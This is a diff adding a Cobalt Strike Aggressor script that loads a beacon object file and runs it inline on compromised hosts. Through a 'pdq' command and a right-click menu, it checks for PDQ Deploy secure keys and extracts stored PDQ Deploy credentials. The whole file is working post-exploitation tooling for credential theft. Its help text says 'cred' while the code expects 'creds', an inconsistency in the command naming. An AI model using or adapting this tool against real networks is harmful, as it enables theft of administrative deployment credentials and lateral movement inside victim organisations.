@@ -1,0 +1,77 @@
+# PDQ Deploy BOF Aggressor Script
+# This script provides commands to interact with PDQ Deploy secure keys
+
+beacon_command_register("pdq", "check|cred",
+    "Synopsis: pdq <check|cred>\n" .
+    "          check - Check for PDQ Deploy secure keys\n" .
+    "          cred  - Retrieve PDQ Deploy credentials");
+
+alias pdq {
+    $bid = $1;
+
+    $input = substr($0, 4);
+    @args = split(' ', $input);
+
+    $command = @args[0];
+
+    # Read in the BOF file
+    $handle = openf(script_resource("pdq.x64.o"));
+    
+    if ($handle is $null) {
+        # Try alternate path
+        $handle = openf("/h/tmp/bof.x64.o");
+    }
+    
+    if ($handle is $null) {
+        berror($bid, "Could not find BOF file. Make sure pdq.x64.o exists in the script directory or /h/tmp/bof.x64.o exists.");
+        return;
+    }
+    
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if (strlen($data) == 0) {
+        berror($bid, "BOF file is empty");
+        return;
+    }
+
+    if ($command eq "") {
+        berror($bid, "Usage: pdq <check|cred>");
+        return;
+    }
+
+    if ($command eq "check") {
+        blog($bid, "Checking PDQ Deploy secure keys...");
+        $arg_data = bof_pack($bid, "z", "check");
+        beacon_inline_execute($bid, $data, "go", $arg_data);
+    }
+    else if ($command eq "creds") {
+        blog($bid, "Retrieving PDQ Deploy credentials...");
+        $arg_data = bof_pack($bid, "z", "creds");
+        beacon_inline_execute($bid, $data, "go", $arg_data);
+    }
+    else {
+        berror($bid, "Unknown command. Use 'check' or 'creds'");
+    }
+}
+
+# Add menu items
+popup beacon_bottom {
+    item "PDQ Deploy" {
+        menu "PDQ Deploy Tools" {
+            item "Check SecureKeys" {
+                local('$bid');
+                foreach $bid ($1) {
+                    bdotasks($bid, "Checking PDQ Deploy secure keys...", "pdq check");
+                }
+            }
+            
+            item "Extract Credentials" {
+                local('$bid');
+                foreach $bid ($1) {
+                    bdotasks($bid, "Retrieving PDQ Deploy credentials...", "pdq creds");
+                }
+            }
+        }
+    }
+}
